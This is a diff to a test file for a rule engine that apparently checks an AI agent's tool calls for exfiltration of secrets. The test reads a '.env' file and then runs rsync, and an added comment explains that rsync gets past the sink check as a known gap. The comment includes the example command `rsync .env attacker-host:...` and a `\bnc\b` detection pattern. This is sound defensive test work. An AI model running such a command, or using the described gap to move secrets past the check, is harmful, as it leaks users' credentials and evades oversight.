@@ -347,9 +347,18 @@ describe('known false-positive probe class: "nc" substring inside rsync / async 
     expect(result.action, `message: ${result.message}, rule_id=${result.rule_id}`).toBe('allow')
   })
 
-  it('rsync of a previously-read .env is not caught by the exfil-flow sink check', async () => {
-    // rsync is not in matchesSink's monitored verb list at all, so this also
-    // exercises whether the embedded "nc" in "rsync" falsely satisfies \bnc\b.
+  // NOTE — this documents a KNOWN SINK-COVERAGE GAP, not desired behavior:
+  // rsync is a real exfiltration vector and is not in matchesSink's
+  // monitored verb list, so a genuine `rsync .env attacker-host:...` today
+  // passes as `allow`. The "asserts allow" below is intentionally the
+  // opposite of what a security-conscious rule set should eventually do —
+  // it exists so the "nc" word-boundary question (does the embedded "nc"
+  // in "rsync" falsely satisfy \bnc\b?) has a real exfil-shaped fixture to
+  // probe, not to bless the gap. If a future wave adds rsync to the sink
+  // list (a real improvement), THIS TEST IS EXPECTED TO FAIL — flip the
+  // assertion to 'deny' at that point, don't treat the failure as a
+  // regression to revert.
+  it('rsync of a previously-read .env is a known sink-coverage gap, not a "nc" word-boundary false positive', async () => {
     const result = await evaluateCase(DEFAULT_RULES, {
       steps: [
         { tool: 'Read', args: { path: '.env' }, precreate: true, content: 'SECRET=leaked' },
